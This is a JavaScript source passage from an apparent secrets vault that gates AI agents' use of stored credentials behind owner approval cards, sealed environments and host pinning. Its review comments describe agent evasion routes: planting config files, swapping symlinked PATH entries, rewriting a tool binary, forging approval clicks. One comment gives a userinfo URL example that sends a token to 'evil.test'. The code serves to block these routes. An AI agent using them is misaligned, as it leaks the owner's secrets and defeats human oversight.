    const qu = reqQuiet.get(pair);
    if (qu && qu > now()) return named('request_quiet', { ref: ref.ref, until: new Date(qu).toISOString() });
    const askers = new Set([...requests.values()].map((x) => x.scope));
    if ([...requests.values()].filter((x) => x.scope === scope).length >= REQUESTS_PER_CALLER) return named('too_many_requests');
    if (!askers.has(scope) && askers.size >= REQUEST_CALLERS_MAX) return named('too_many_askers');   // B-4934: a conversation already asking is never refused for others' asks
    const askId = randomBytes(16).toString('hex');
    const who = String(VB.actorName(caller.name, 'a conversation')).slice(0, 80);
    const q = { askId, pair, scope, conv: caller.conversationId, sessionKey: caller.sessionKey || null, who, ref: ref.ref, id: ref.id, label: String(row.label || ref.label).slice(0, 120), purpose: said, detail: '', askedAt: now(), todoId: null };
    const lines = requestWords(q);
    q.detail = lines.map(fill).join('\n');
    if (q.detail.length > DETAIL_MAX) return named('card_too_long');
    if (userTodos) {
      try {
        const it = userTodos.add(caller.sessionKey || 'vault', {
          origin: 'vault', urgency: 'high', kind: 'action', by: 'agent', sessionName: who,   // NO expiresAt: a request waits for the owner (design D4 — never expires; a lock withdraws it)
          text: `${who} asks to use a stored secret`,
          detail: q.detail,
          i18n: { text: { key: '{who} asks to use a stored secret', params: { who } }, detail: lines },
          action: { type: 'vault-grant-ask', askId },   // = REQUEST_TYPE (spelled for the approval census's grep)
        });
        q.todoId = it && it.id;
      } catch (e) {
        log(`${who}: the request could not be filed in For you: ${e.message}`);
        return named('ask_unfiled');
      }
    }
    requests.set(askId, q); reqByPair.set(pair, askId);
    askingLine();
    audit('vault-request', { by: { kind: 'agent', key: caller.sessionKey || null, name: caller.name || null }, conv: scope, entry: ref.ref, purpose: said, askId });
    return { ok: true, askId, ref: ref.ref, todoId: q.todoId || null };   // lane chat-needs-you-card: the item the agent's line names
  }
  /** A PERSON's answer to a request (src/routes/vault.js: people only): once | 8h | deny → the grant row. A grant opens a
   *  closed entry for a conversation — the per-row switch's job — so it needs the switch's 验证是你 (`reauthed`: this page's
   *  window, the second password again; the review: a click alone is a header a local process can forge on a hub with no
   *  sign-in); Deny stays a click. */
  function answerRequest(askId, { answer: a, reauthed = false, by = 'user' } = {}) {
    const id = String(askId || '');
    const q = requests.get(id);
    if (!q) return { ok: false, code: settled.has(id) ? 'ask_settled' : 'ask_unknown' };
    if (!GRANT_ANSWERS.includes(a)) return { ok: false, code: 'bad_grant_answer' };
    const said = { by: String(by).slice(0, 40), conv: q.scope, entry: q.ref, askId: q.askId };
    if (a === 'deny') { settleRequest(q, 'denied', 'answered'); audit('vault-grant', { ...said, answer: 'deny' }); return { ok: true, outcome: 'denied' }; }
    if (vaultState() !== 'unlocked') { settleRequest(q, 'vault_locked'); return { ok: false, code: 'vault_locked' }; }
    if (!reauthed) return { ok: false, code: 'reveal_needs_password' };   // the card stays up
    // THE BELT (as the run card's): a grant is for what the owner was SHOWN — the item still open, this request's, its very detail
    if (q.todoId && userTodos && typeof userTodos.get === 'function') {
      let it = null; try { it = userTodos.get(q.todoId); } catch { }
      const shown = !!(it && it.status === 'open' && it.action && it.action.type === REQUEST_TYPE && it.action.askId === q.askId && String(it.detail || '') === q.detail);
      if (!shown) { settleRequest(q, 'changed', 'item-changed'); return { ok: false, code: 'ask_changed' }; }
    }
    if (!liveOf(q.conv)) { settleRequest(q, 'denied', 'gone'); return { ok: false, code: 'conversation_gone' }; }
    const ref = VR.parseRef(q.ref), row = ref && rowOf(ref);
    if (!row) { settleRequest(q, 'denied', 'entry gone'); return { ok: false, code: 'entry_unknown' }; }
    if (!classOf(ref, row).runnable) { settleRequest(q, 'denied', 'its own door'); return { ok: false, code: 'entry_has_its_own_door' }; }
    const t = now(), until = t + GRANT_MS;
    grants.set(q.pair, { conv: q.scope, key: null, entries: [q.id], until, once: a === 'once', at: t, by: said.by, askId: q.askId, purpose: q.purpose });
    audit('vault-grant', { ...said, answer: a, until });
    settleRequest(q, 'granted', 'answered');
    return { ok: true, outcome: a === 'once' ? 'granted-once' : 'granted', until };
  }
  /** lane vault-paste-request: THE PASTE IS THE GRANT — the owner pasted a NEW free entry into For you in answer to THIS
   *  conversation's request (its purpose on the card, src/server/vault-paste-door.js): the conversation may use that one
   *  entry in runs for GRANT_MS (a lock ends it; each new command shape still draws its run card). No 验证是你: the entry did
   *  not exist before the paste — a press forged on a hub with no sign-in grants only the value it supplied itself, never a
   *  secret the owner had stored. → { ok, until, hours } | a named refusal. */
  function grantPasted({ scope = '', ref = '', purpose = '', by = 'user', requestId = null } = {}) {
    const r = VR.parseRef(String(ref || ''));
    if (!scope || !r || !VR.isFreeEntry(r.store, r.entry, r.field)) return named('bad_reference');
    if (vaultState() !== 'unlocked') return named('vault_locked');
    const t = now(), until = t + GRANT_MS;
    grants.set(pairOf(String(scope), r.id), { conv: String(scope), key: null, entries: [r.id], until, once: false, at: t, by: String(by).slice(0, 40), askId: null, purpose: String(purpose || '').slice(0, PURPOSE_MAX) });
    audit('vault-grant', { by: String(by).slice(0, 40), conv: String(scope), entry: r.ref, answer: 'pasted', requestId, until });
    return { ok: true, until, hours: GRANT_MS / 3600e3 };
  }
  /** `vibespace-vault uses` (design D4): THIS conversation's grants, its open requests and its own use lines (the engine reads
   *  the audit file's tail) — references, purposes, times, outcomes, receipts; never a value, never another conversation's. */
  function usesFor(caller = {}) {
    if (caller.job) return named('job_no_use');
    const scope = scopeOf(caller);
    if (!scope) return named('unauthorized');
    const t = now(), mine = [];
    for (const [p, g] of grants) { if (!(g.until > t)) { grants.delete(p); continue; } if (g.conv === scope) mine.push(g); }
    const refOfId = (id) => { const r = VI.parseRef(id); const x = r && VR.refFor(r.store, r.entry, r.field); return x ? x.ref : null; };
    return {
      ok: true,
      state: vaultState(),
      grants: mine.map((g) => ({ entry: refOfId(g.entries[0]), purpose: g.purpose, once: g.once, until: new Date(g.until).toISOString(), at: new Date(g.at).toISOString() })),
      requests: [...requests.values()].filter((q) => q.scope === scope).map((q) => ({ entry: q.ref, purpose: q.purpose, at: new Date(q.askedAt).toISOString() })),
      uses: typeof vault.usesOf === 'function' ? vault.usesOf(scope) : [],
    };
  }

  // ── THE PLACE: the cwd fence, argv[0] on the base PATH, a template's text ──
  const BV = () => require('../browser-verbs.js');
  const physOps = { lstat: (x) => fs.lstatSync(x), readlink: (x) => fs.readlinkSync(x) };
  const spell = (d) => { let x = null; try { x = fs.realpathSync(d); } catch { x = null; } return x && x !== d ? [d, x] : [d]; };
  /** `p` (absolute, physical) inside the conversation's project folder / the temp folder / ~/Downloads, outside what the
   *  browser CLI's write rule refuses (.ssh, .git, VibeSpace's data, a home's dot-entries) — → the physical path | null. */
  function fenced(p, sessionCwd) {
    if (typeof p !== 'string' || p[0] !== '/' || DOOR.blocked(p)) return null;
    const b = BV();
    const r = b.physicalPath(p, { base: '/', home, ...physOps });
    if (!r.ok) return null;
    const root = typeof sessionCwd === 'string' && sessionCwd[0] === '/' ? b.physicalPath(sessionCwd, { base: '/', home, ...physOps }) : null;
    const v = b.writePathVerdict([{ file: p, paths: path.resolve(p) === r.path ? [r.path] : [path.resolve(p), r.path] }], {
      allow: [tmpDir, path.join(home, 'Downloads')].flatMap(spell), homes: spell(home), dataDir: spell(dataDir), sessionRoot: root && root.ok ? root.path : null });
    return v ? null : r.path;
  }
  /** argv[0] → its real path: a name with a slash from the cwd, a bare name on the base env's PATH (absolute entries only). */
  function resolveTool(argv0, cwd, env) {
    const x = String(argv0 || '');
    const isExe = (p) => { try { const st = fs.statSync(p); if (!st.isFile()) return false; fs.accessSync(p, fs.constants.X_OK); return true; } catch { return false; } };
    let hit = null;
    if (x.includes('/')) { const p = path.resolve(cwd, x); if (!DOOR.blocked(p) && isExe(p)) hit = p; }
    else for (const d of String((env && env.PATH) || '').split(':')) { if (!d || d[0] !== '/' || DOOR.blocked(d)) continue; const p = path.join(d, x); if (isExe(p)) { hit = p; break; } }
    if (!hit) return null;
    try { return fs.realpathSync(hit); } catch { return null; }
  }
  /** The templates a `--file NAME=@path` names: read inside the fence, a regular file, ≤ TEMPLATE_MAX. → { ok, templates } | refusal. */
  function readTemplates(req, cwd, sessionCwd) {
    const out = {};
    for (const [, v] of req.file || []) {
      if (!String(v).startsWith('@')) continue;
      const p = String(v).slice(1);
      if (!p || Object.prototype.hasOwnProperty.call(out, p)) continue;
      if (DOOR.blocked(path.resolve(cwd, p))) return named('storage_blocked', { template: p });
      const abs = fenced(path.resolve(cwd, p), sessionCwd);
      if (!abs) return named('template_refused', { template: p });
      try { out[p] = readBounded(abs, VR.TEMPLATE_MAX).toString('utf8'); }   // one fd: never through a link swapped in, never a FIFO's wait
      catch (e) { return named(e && e.code === 'EFBIG' ? 'template_too_long' : e && (e.code === 'ENOTREG' || e.code === 'ELOOP' || e.code === 'ENOENT') ? 'template_refused' : 'template_unread', { template: p }); }
    }
    return { ok: true, templates: out };
  }

  // ── THE CARD'S WORDS (the whole run, deterministic: the belt compares it) ──
  function detailOf(run, shape, cwd, asks = null) {
    const L = [cmdText(run.argv), ''];
    L.push(`Program: ${run.tool}${run.programWritable ? ' — in a folder an agent can write' : ''}`);   // the review: the typed name is not what runs
    L.push(`Secrets: ${run.refs.map((r) => r.ref).join(', ')}`);
    L.push(`Given as: ${run.injection.join(', ')}`);
    if (asks) {   // lane vault-agent-own: WHO stored each entry and WHY this run asks (the card the owner still sees keeps its words)
      for (const r of run.refs) { const e = asks.facts.find((x) => x.id === r.id) || {}; L.push(`Stored by: ${r.ref} — ${e.own ? (e.prov === 'minted' ? `this conversation (the hub minted it${forWords(VR.forHostOf(e.forHost))} — the agent never saw it)` : 'this conversation (it saw the value)') : 'you'}`); }   // the review: the agent's --for normalized, never its raw words on the owner's card
      if (asks.why.includes('not-own')) L.push('Why it asks: another conversation is using it — this conversation did not store it');
      for (const a of asks.away) {
        if (a.unknown) L.push(`Why it asks: where this command sends it cannot be told (a shell or an interpreter, a tool VibeSpace does not know, a host it does not read, a routing flag, a config file, the project's own code or a program an agent could have written) — ${a.ref} was minted${forWords(a.forHost)}. ${a.keep ? 'Allow lets this command shape run with it again without asking until the vault locks.' : 'Allow lets this one run go — on this shared instance every run of it asks again.'}`);   // round 2: a cluster keeps no shape pass
        else L.push(`Why it asks: it would go to another host — ${a.ref} was minted${forWords(a.forHost)}, this run sends it to ${a.host}. Allow lets it go to ${a.host} again without asking until the vault locks.`);
      }
    }
    if (run.argvExposed) L.push('ON THE COMMAND LINE: every user of this machine can read it while it runs (/proc/<pid>/cmdline)');
    L.push(`Hosts: ${shape.routeHosts.length ? shape.routeHosts.join(', ') : 'unknown — the tool names none'}`);   // round 15: where it is SENT (the ONE routing set)
    if ((shape.mentions || []).length) L.push(`Mentions (named in the command, not where it is sent): ${shape.mentions.join(', ')}`);   // round 16 (MINOR): shape.mentions excludes the row's OWN defaults (never api.github.com) — only a FREE-TEXT host that is not a route
    if (run.plainEnv.length) L.push(`Env: ${run.plainEnv.map((e) => `${e.name}=${quote(e.value)}`).join(' ')}`);
    L.push(`Folder: ${cwd}`);
    for (const f of run.files) if (f.template != null) L.push(`Template ${f.name} (@${f.template}):`, String(f.text).replace(/\s+$/, ''));   // round 18 (item 2): a template is shown IN FULL \u2014 an over-bound one is refused card_too_long before this card is built (never a note that hides it while the run proceeds)
    L.push(`This shape = ${shape.kind === 'tool' ? 'the tool + its flags + the hosts + the secrets; positional arguments may change' : 'this whole command line'}.`);
    if (!shape.always) L.push(`«Always» is not offered: ${shape.configReads ? `the template's \`${shape.configReads}\` directive reads a file, routes to a host or redirects in a way this card cannot vouch for \u2014 the agent can change it after you approve` : (NO_ALWAYS[shape.noAlways] || shape.noAlways)}.`);   // round 18/19 (item 3/4): a shown config template whose directive nests a file, routes off the URL's host, redirects or expands a {{var}} at run time names that directive, so the owner sees why a template the card DID show still cannot be «always»
    return L.join('\n').trim();
  }

  const forWords = (h) => (h ? ` for ${h}` : ' with no host named');
  // ── THE RUN ──
  const callerRuns = (conv) => [...runs].filter((r) => r.conv === conv).length;
  function killGroup(rec, sig) {
    const child = rec.child;   // THIS process's own spawn handle — its group (spawned detached) ends with it
    if (!child || !child.pid) return;
    try { process.kill(-child.pid, sig); } catch { try { child.kill(sig); } catch { } }
  }
  function stop(rec, why) {
    if (rec.stopped) return;
    rec.stopped = why;
    killGroup(rec, 'SIGTERM');
    rec.hard = timers.set(() => killGroup(rec, 'SIGKILL'), killGraceMs);
    rec.hard?.unref?.();
  }
  /**
   * ONE run. `caller` = { conversationId, sessionKey, name, cwd (the conversation's project folder), remote, job };
   * `args` = the CLI's words after `run`; `cwd` = where the agent stood. → { ok: true, exit, signal, timedOut, truncated, ms,
   * stdout, stderr, scrubbed, redacted, by } | { ok: false, code, words, … }.
   */
  // round 11 (BLOCKER): the environment of a vault run is a place NOBODY can write, made for THAT run — not a relocation. Round
  // 10 pointed HOME / GH_CONFIG_DIR at a hub-minted dir under data/, but that dir is the hub UID's (= the agent's uid), 0700 yet
  // persistent: a same-uid leg plants config.yml (http_unix_socket) or hosts.yml and the NEXT run reads it (wire-proven). So HOME,
  // the tool's config-dir env and every XDG_* point at SEAL_NOWHERE — a path under / (root-owned) the agent cannot create or
  // write, so no planted file is ever read (gh needs no config dir to run an env-token verb). The HOST is pinned to the host the
  // verdict APPROVED for the run (round 13: shape.hosts — the mint's --for for an own run, the card's host when the call names
  // another), never blindly the mint's --for; gh's `git` child reads no user/system config. The PATH keeps only
  // ROOT-OWNED dirs with no group/other write bit (round 12, BLOCKER: "the agent cannot write it" is OWNERSHIP, never mode bits —
  // a uid-owned dir's owner, the agent, flips the write bit at will, so a 0555 uid dir is NEVER safe) — and (round 13) the child
  // PATH holds the REALPATH of each surviving dir, never the agent's string, computed ONCE and cached (no path stat'd on the loop
  // at spawn); if none survive the run is refused BY NAME (run_path_unsafe), never a
  // silent git-not-found (round 15: only a git-DRIVING verb needs git — git_not_on_seal by name, re-probed per call). The TOOL
  // (a runSeal credential tool) runs with a minted value ONLY when SEALED (root-owned fd); its bytes are a DRIFT RECORD, never a
  // gate (round 15 — a sealed tool's current bytes ARE authoritative, root is the writer), and the agent's env is
  // an ALLOWLIST (src/vault-run.js envRefusedOf): only the row's reviewed names + the credential (as a reference) pass.
  // round 12/13 (BLOCKER): a path is the hub's only when ROOT owns it (st.uid === 0) with no group/other write bit, AND every
  // ancestor of its REALPATH is the same — r12 followed symlinks and kept the agent's STRING, so ~/.local/bin -> /usr/bin passed
  // and was baked by NAME, then re-pointed to an agent dir after the spawn. r13 bakes the realpath (/usr/bin) and walks the chain
  // (realpathSync + a root-owned check on every component): a uid-owned link OR dir anywhere disqualifies, so nothing the agent
  // can swap sits on the child PATH (the premise «an agent cannot insert a link into a root-owned string» WAS the flaw).
  // round 13 (BLOCKER): the sealed PATH is the REALPATH of each surviving baked entry, never the agent-influenceable string (an
  // agent-owned entry symlinked to a root dir passed r12's symlink-following check and was kept BY NAME, then re-pointed after the
  // spawn). Computed ONCE for the hub's (fixed) baked PATH and cached, so NO path is stat'd on the event loop at spawn (r11 fixup
  // 1); de-duplicated, order kept. Empty ⇒ run_path_unsafe by name. sealDir is the injectable realpath+chain check (default real).
  let _sealedPath = null;
  const sealedPathOf = (b) => {
    const src = String((b && b.PATH) || '');
    if (_sealedPath && _sealedPath.src === src) return _sealedPath.out;
    const seen = new Set(), out = [];
    for (const d of src.split(':')) { const real = sealDir(d); if (real && !seen.has(real)) { seen.add(real); out.push(real); } }
    _sealedPath = { src, out: out.join(':') };
    return _sealedPath.out;
  };
  function sealEnvFor(row, b, forHost) {
    if (!row || !row.runSeal) return {};
    const dir = SEAL_NOWHERE;   // does not exist, cannot be made by this uid — every HOME/config/XDG read falls on nothing
    const out = { HOME: dir, XDG_CONFIG_HOME: dir, XDG_STATE_HOME: dir, XDG_CACHE_HOME: dir, XDG_DATA_HOME: dir, PATH: sealedPathOf(b) };
    if (row.runSeal.configDirEnv) out[row.runSeal.configDirEnv] = dir;   // GH_CONFIG_DIR
    if (row.runSeal.hostEnv && forHost) out[row.runSeal.hostEnv] = forHost;   // GH_HOST pinned to the minted value's --for host
    if (row.runSeal.childEnv) Object.assign(out, row.runSeal.childEnv);   // gh's git child: GIT_CONFIG_GLOBAL=/dev/null, NOSYSTEM, no prompt
    return out;
  }
  async function run({ caller = {}, args = [], cwd = null, signal = null } = {}) {
    const t0 = now();
    const by = { kind: caller.job ? 'job' : 'agent', key: caller.sessionKey || null, name: caller.name || null };
    const scope = scopeOf(caller);
    const runReceipt = `vr-${randomBytes(8).toString('hex')}`;   // ONE receipt per run: the answer of a run that ran, its run line and every entry's use line (a refusal's lines carry it too — the audit's)
    let usedRefs = null;           // the plan's references, once it parsed — each one's use line (lane vault-manual-and-lock)
    const purposes = new Map();    // entry id → the purpose of the grant that opened it
    const useLines = (outcome, receipt, ran = false) => {
      if (!usedRefs || (USE_SKIP.has(outcome) && !ran) || typeof vault.noteUse !== 'function') return;   // a child that RAN with the value is a use whatever ended it
      for (const r of usedRefs) { try { vault.noteUse(r.ref, { by: by.kind, door: 'run', conv: scope }, { outcome: outcome === 'ran' ? 'ok' : outcome, purpose: purposes.get(r.id) || null, actor: VB.actorName(caller.name, 'a conversation'), receipt, store: r.store, used: ran }); } catch { } }
    };
    const note = (outcome, extra = {}) => { audit('vault-run', { by, outcome, ...extra }); useLines(outcome, runReceipt, !!extra.receipt); };   // ONE line: the actor, the outcome (ran | the refusal's code), the facts — never a value; + each entry's use line
    if (caller.job) { note('job_no_use'); return named('job_no_use'); }
    if (!caller.conversationId) return named('unauthorized');
    const st = vaultState();
    if (st === 'not_set_up') return named('vault_not_set_up');
    if (st !== 'unlocked') { try { vault.blocked(VB.actorName(caller.name, 'a conversation'), 'vibespace-vault run'); } catch { } note('vault_locked'); return named('vault_locked'); }
    if (!Array.isArray(args) || args.reduce((n, x) => n + String(x).length, 0) > ARGS_MAX || String(cwd || '').length > CWD_MAX) return named('request_too_large');
    const pr = VR.parseRunArgs(args);
    if (!pr.ok) return pr;
    const req = pr.req;
    if (caller.remote || req.on) { note('device_road_later'); return named('device_road_later'); }
    const all = [...req.argv, ...(req.env || []).flat(), ...(req.file || []).flat(), req.stdin || '', String(cwd || '')];   // the cwd too: the card prints it
    if (all.some((x) => HC.hiddenCharsOf(String(x), { max: 1 }).length)) return named('hidden_chars');
    if (cwd && DOOR.blocked(String(cwd))) { note('storage_blocked'); return named('storage_blocked'); }
    const place = fenced(String(cwd || ''), caller.cwd);
    if (!place) { note('cwd_refused', { cwd: String(cwd || '').slice(0, 300) }); return named('cwd_refused'); }
    const base = agentEnv();
    const resolved = req.argv.length ? resolveTool(req.argv[0], place, base) : null;
    if (req.argv.length && !resolved) {
      const early = VR.refusedTool(req.argv[0]);   // a refused name is refused by name even when it is not installed here
      return early || named('tool_not_found', { tool: VR.toolNameOf(req.argv[0]) });
    }
    const tp = readTemplates(req, place, caller.cwd);
    if (!tp.ok) return tp;
    if (Object.values(tp.templates).some((t) => HC.hiddenCharsOf(t, { allowCR: true, max: 1 }).length)) return named('hidden_chars');
    // round 12/13/14 (BLOCKER-class): a tool whose binary OR its dir is NOT root-owned (uid-owned: ~/.local/bin, a brew prefix,
    // nvm) is one the agent can REPLACE. A PINNED credential tool (gh) runs with the minted value ONLY when it is SEALED — its
    // realpath chain is root-owned AND the OPEN fd's inode is root-owned with no group/other write (round 14, verified at the hash
    // below); a uid-owned credential tool is tool_not_sealed (r13 exec'd an fd whose uid-owned inode the agent rewrote IN PLACE —
    // the fd pins WHICH inode runs, root ownership pins WHAT is in it). On a sealed inode the sha256 is a DRIFT RECORD (round 15:
    // recorded, never a gate — a root-owned gh of ANY version runs), streamed over the fd and exec'd as the SAME inode via
    // /proc/<pid>/fd. A non-runSeal uid-owned tool still BLINDS
    // (programWritable — the card asks every run), unchanged.
    const replaceable = !!resolved && !(isRootOwned(resolved) && isRootOwned(path.dirname(resolved)));
    const toolName = resolved ? VR.toolNameOf(req.argv[0], resolved) : null;
    const toolRow = resolved ? VR.knownToolOf(toolName) : null;   // round 15: a KNOWN credential tool (gh, runSeal) is sealed-checked + drift-hashed whether its path is root- or uid-owned
    const sealedTool = !!(toolRow && toolRow.runSeal);   // set ⇒ the sealed-check + drift hash runs in run(); the SAME open fd is exec'd. The digest is a DRIFT RECORD, never a gate against a shipped constant (r14's bug: every root-owned non-2.102.0 gh refused)
    const programWritable = replaceable && !sealedTool;
    const spec = VR.planOf({ ...req, resolved, templates: tp.templates, programWritable });
    if (!spec.ok) { note(spec.code, { tool: resolved, why: spec.why || null }); return spec; }
    usedRefs = spec.refs;
    const shape = VR.shapeOf(spec), key = VR.shapeKeyOf(shape), shapeId = shapeIdOf(key);
    const head = { tool: spec.tool, entries: spec.refs.map((r) => r.ref), shapeId, hosts: shape.routeHosts, routeHosts: shape.routeHosts, mentions: shape.mentions, injection: spec.injection, argvExposed: spec.argvExposed, cwd: place, cmd: utf8Head(SS.redactSecrets(cmdText(spec.argv)).text) };
    // round 18 (item 1 BLOCKER): a URL on the command line carries userinfo (`https://ghe.example.test'@evil.test/…`) — the WHATWG parser reads the host PAST the userinfo (evil.test) where URL_RE stopped at the quote (ghe.example.test); a credential-carrying URL is never a route, refuse by name before the host verdict
    if (shape.userinfo) { note('url_userinfo', { ...head }); return named('url_userinfo'); }
    // round 16 (MINOR): a routing value named a host that does not parse (psql -h ,db.example.com) — refuse by name; «sends it to null» never reaches the verdict or the card
    if (shape.badHost) { note('bad_host', { ...head }); return named('bad_host'); }
    // round 16 (BLOCKER): a SEALED credential tool (gh) whose command names TWO different hosts it could contact — a URL in a
    // positional (issue view <url>) vs -R / GH_HOST / a repo spec. The seal pins ONE GH_HOST and homes ONE credential, so
    // which host gets the token cannot be told; refuse rather than silently send GH_ENTERPRISE_TOKEN to the URL's host (the r15
    // leak: the URL host was dropped from routeHosts, so the verdict saw only the -R host and approved ok:own with no card).
    if (sealedTool && shape.routeHosts.length > 1) { const hs = [...shape.routeHosts]; note('two_hosts', { ...head }); return named('two_hosts', { hosts: hs, words: `this command names two hosts it could contact — ${hs.join(' and ')}: a URL in a positional points to one and -R / GH_HOST (or a repo spec) to another. A sealed credential tool homes the token to only one host, so which one receives it cannot be told — nothing ran. Name a single host (drop the URL, or point -R at the URL's host).` }); }
    // lane vault-agent-own: ANOTHER conversation's agent entry is refused by name before any fact of it is read (no switch opens it)
    const foreign = spec.refs.find((r) => VR.agentScopeOf(r) && !VR.ownsAgentEntry(r, caller));
    if (foreign) { note('use_not_granted', { ...head, ref: foreign.ref }); return named('use_not_granted', { ref: foreign.ref }); }
    // THE FACTS the verdict reads: each entry's row (exists), its switch (open), its class (the engine's check) and its length
    const d = load();
    const entries = [], nameById = {};   // lane vault-agent-own r20: each ref's Vault-window name (its row label) for cardFactsOf — a ref with no row falls to the model's shortRefId
    const admitted = [];   // a GRANT that opened a closed entry (lane vault-manual-and-lock) — a once-grant is spent before the run starts
    for (const r of spec.refs) {
      const row = rowOf(r), c = classOf(r, row);
      if (row && row.label != null) nameById[r.id] = String(row.label);
      if (!c.runnable) { note('entry_has_its_own_door', { ...head, ref: r.ref }); return named('entry_has_its_own_door', { ref: r.ref, door: c.door, words: `${VR.WORDS.entry_has_its_own_door}: ${c.door}` }); }
      const own = !!row && VR.ownsAgentEntry(r, caller), pv = (own && row.provenance) || {};   // lane vault-agent-own: an entry it made itself — open to it by construction
      const sw = !!(row && d && d.runnable.has(r.id)), g = row && !own ? grantOf(scope, r.id) : null;
      if (g) purposes.set(r.id, g.purpose);
      if (g && !sw) admitted.push({ pair: pairOf(scope, r.id), g });
      const open = sw || !!g;   // the owner's switch (every conversation) OR the grant his answer wrote (this one)
      let bytes = 0;
      if (row && (open || own)) { try { const v = valueOf(r); bytes = v == null ? 0 : Buffer.byteLength(v, 'utf8'); } catch { bytes = 0; } }
      entries.push({ id: r.id, exists: !!row, open, bytes, ...(own ? { own: true, prov: pv.prov === 'minted' ? 'minted' : 'stored', forHost: pv.forHost || null } : {}) });
    }
    const pair = pairOf(caller.conversationId, key);
    const stored = d ? d.always.find((a) => a.conv === caller.conversationId && a.key === key) : null;
    const short = shortAlways.get(pair);
    const remembered = stored && (stored.until == null || stored.until > now()) ? stored : short && short.until > now() ? { until: short.until } : null;
    // granted: P0 has no who-may-use list — the owner's per-row switch and the card ARE the grant (P1 vault-use-reach narrows it
    // to whom); an AGENT's own entry (`agent:<scope>/<name>`) is its conversation's only
    const granted = spec.refs.every((r) => !VR.agentScopeOf(r) || VR.ownsAgentEntry(r, caller));   // a mint's scope: the conversation's registered id, or (lane vault-agent-own) its durable one
    const passes = () => [...hostPasses.values()].filter((p) => p.scope === scope).map((p) => ({ id: p.id, host: p.host }));   // lane vault-agent-own: the hosts the owner let a minted value go to
    // round 14/15: the digest is taken after the PER-CALLER cap (round 15: a refused call never hashes) and memoised per inode
    // identity; no await sits between the hub-wide cap check and runs.add (20 parallel calls see callerRuns grow and 16 get
    // too_many_runs, not 20 spawns), and no grant is spent before a sealed-tool refusal. After the await the
    // verdict re-reads the vault state, and we re-check the state + the signal BY NAME (a lock ⇒ vault_locked, a gone caller ⇒
    // caller_gone — nothing spawned, never spawn-then-stop). The open fd is handed to spawnRun (it exec's the SAME inode) or
    // closed here on any early return (the finally).
    let toolFd = null, fdHandedOff = false;
    const closeTool = () => { if (toolFd != null) { try { fs.closeSync(toolFd); } catch { } toolFd = null; } };
    const lg0 = lockGen;
    try {
      if (sealedTool) {
        // round 15 (BLOCKER): a KNOWN credential tool (gh) runs with a minted value ONLY when SEALED — its realpath chain is
        // root-owned AND the OPEN fd's inode is root-owned with no group/other write (toolSealed). THE SEAL IS THE CONTENT FENCE:
        // only root can change a root-owned file, so its CURRENT bytes are authoritative. The sha256 is NOT a gate against a shipped
        // constant (r14 refused every root-owned gh whose bytes ≠ the one pinned 2.102.0 — the hub's own /usr/bin/gh 2.100.0, every
        // apt gh, the very remedy tool_not_sealed prescribes); it is a DRIFT RECORD: the first run records {path,dev,ino,size,mtime,
        // sha256} in data/vault-run-tools.json, a later run whose bytes/inode differ RECORDS the drift (an audit line + one notice)
        // and RUNS — root changed it, which is the fence's own premise. A uid-owned tool is tool_not_sealed (r13's /proc/fd exec'd
        // the agent's CURRENT bytes after an in-place rewrite — O_RDONLY and the fd pin the inode, never its content). The digest is
        // taken AFTER the per-caller cap (a refused call never hashes) and memoised per inode identity (one hash per tool change).
        try { toolFd = fs.openSync(spec.tool, 'r'); } catch { note('tool_not_sealed', { ...head, tool: toolName, why: 'unreadable' }); return named('tool_not_sealed', { tool: toolName }); }
        if (!toolSealed(spec.tool, toolFd)) { note('tool_not_sealed', { ...head, tool: toolName }); return named('tool_not_sealed', { tool: toolName }); }
        if (callerRuns(caller.conversationId) >= RUNS_PER_CALLER) return named('too_many_runs');   // round 15 (MINOR): the PER-CALLER cap is checked BEFORE the hash — a refused call never hashes the 42 MB binary
        const tstat = fstatOf(toolFd);
        const got = await digestOf(toolFd, tstat);   // memoised per (dev,ino,size,mtime,ctime): concurrent callers share ONE hash, a repeat run of an unchanged tool re-hashes nothing
        driftNote(spec.tool, tstat, got, head, toolName);   // the DRIFT RECORD — records + audits a changed root-owned tool; NEVER refuses
        if (!hasProcFd) closeTool();   // a sealed (root-owned) inode is unswappable by path — exec by path where /proc/<pid>/fd is absent (not Linux)
        if (vaultState() !== 'unlocked') { try { vault.blocked(VB.actorName(caller.name, 'a conversation'), 'vibespace-vault run'); } catch { } note('vault_locked', { ...head }); return named('vault_locked'); }
        if (signal && signal.aborted) { note('caller_gone', head); return named('caller_gone'); }
      }
      // round 15 (MINOR): only the gh verbs that DRIVE git (repo clone/fork/sync, pr checkout, pr merge --delete-branch, repo
      // create --push/--clone, pr create, extension install/upgrade, args after --) need git on the sealed PATH; gh api / issue list
      // / pr view never run git and must NOT be refused for a missing git (r14's gitOnSeal refused EVERY gh run). A git-driving verb
      // on a hub without git is git_not_on_seal by NAME (install git); the probe is RE-ASKED here when it was false at boot (git may
      // have been installed since — a bounded statSync over the already-computed sealed dirs, never a PATH recompute).
      if (sealedTool && spec.row && spec.row.runSeal && shape.gitDriven) {
        if (gitOnSeal === false) gitOnSeal = probeGit(sealedDirs);
        if (gitOnSeal === false) { note('git_not_on_seal', { ...head, tool: toolName }); return named('git_not_on_seal'); }
      }
      let verdict = VR.runVerdict({ state: vaultState(), plan: spec, shape, entries, granted, remembered, seen: seen.has(pair), instance: instanceKind(), policy: policy(), passes: passes(), now: now() });
      if (!verdict.ok && verdict.ask) {   // lane vault-agent-own r20b: a late «allow once» pass runs this shape ONCE with no card (consumed); an open late card for this shape re-asks the one card
        const lp = lateOnce.get(pair);
        if (lp && lp.until > now()) { consumeLate(pair); audit('vault-run-late-allow', { ...head, shapeId: shapeIdOf(key) }); verdict = { ok: true, by: 'late' }; }
        else { if (lp) consumeLate(pair); const lid = latePair.get(pair); if (lid && lateAsks.has(lid)) { restartLate(lateAsks.get(lid)); note('ask_pending', { ...head, askId: lid }); return named('ask_pending'); } }
      }
      let askId = null, asked = null;
      if (!verdict.ok && verdict.ask) {
        // round 18/19 (item 2 + item 5): a template over the card render bound ⇒ card_too_long — but ONLY here, where a card is DRAWN (an owner entry needing approval). An own-entry run or a remembered pass returned verdict.ok above and never reached this bound (base ran an own 7 KB body by:own; daade1a7 refused it with words about an approval that never happens on that road).
        if (shape.cardTooLong) { const c = shape.cardTooLong; return named('card_too_long', { template: c.name, words: `this run needs your approval, and the template ${c.name} (@${c.template}) is ${c.bytes} bytes — longer than ${VR.TEMPLATE_CARD_MAX} bytes, so the card cannot show it in full and you would be approving a run you cannot read; shorten the template (or pass its bytes a smaller way) — nothing ran` }); }
